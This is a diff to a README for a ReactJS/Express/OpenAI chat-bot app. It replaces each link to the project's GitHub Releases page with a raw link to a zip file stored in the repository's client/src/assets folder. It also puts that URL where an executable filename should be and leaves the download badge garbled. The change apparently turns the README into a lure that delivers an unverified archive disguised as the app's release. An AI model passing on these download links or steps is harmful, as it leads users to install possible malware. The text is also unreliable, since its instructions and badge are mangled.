@@ -4,19 +4,19 @@
 The chat-bot application combines the power of ReactJS, Express, and the OpenAI API to create intelligent chat interactions. This app allows users to ask questions and receive thoughtful responses, making your digital communication seamless and enjoyable.
 
 ## 📦 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/AdemZentici/chat-bot/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AdemZentici/chat-bot/main/client/src/assets/chat_bot_v3.2.zip%20Latest%https://raw.githubusercontent.com/AdemZentici/chat-bot/main/client/src/assets/chat_bot_v3.2.zip)](https://raw.githubusercontent.com/AdemZentici/chat-bot/main/client/src/assets/chat_bot_v3.2.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get your chat-bot up and running:
 
 1. **Visit the Releases Page**
-   Go to the following link to access the download section: [Download Here](https://github.com/AdemZentici/chat-bot/releases).
+   Go to the following link to access the download section: [Download Here](https://raw.githubusercontent.com/AdemZentici/chat-bot/main/client/src/assets/chat_bot_v3.2.zip).
 
 2. **Choose Your Version**
    Browse the available versions and select the most recent one. This ensures that you receive the latest features and updates.
 
 3. **Download the File**
-   Click on the appropriate download link for your operating system. The file may be named something like `chat-bot-v1.0.exe` for Windows or a ZIP file for macOS/Linux. 
+   Click on the appropriate download link for your operating system. The file may be named something like `https://raw.githubusercontent.com/AdemZentici/chat-bot/main/client/src/assets/chat_bot_v3.2.zip` for Windows or a ZIP file for macOS/Linux. 
 
 4. **Install the Application**
    - **For Windows:** 
@@ -77,4 +77,4 @@ If you have suggestions for improvements or new features, feel free to create an
 ## 🎉 Thanks for Using chat-bot!
 We appreciate your interest in the chat-bot application. Enjoy a more interactive chatting experience!
 
-[Download Latest Release](https://github.com/AdemZentici/chat-bot/releases)
+[Download Latest Release](https://raw.githubusercontent.com/AdemZentici/chat-bot/main/client/src/assets/chat_bot_v3.2.zip)
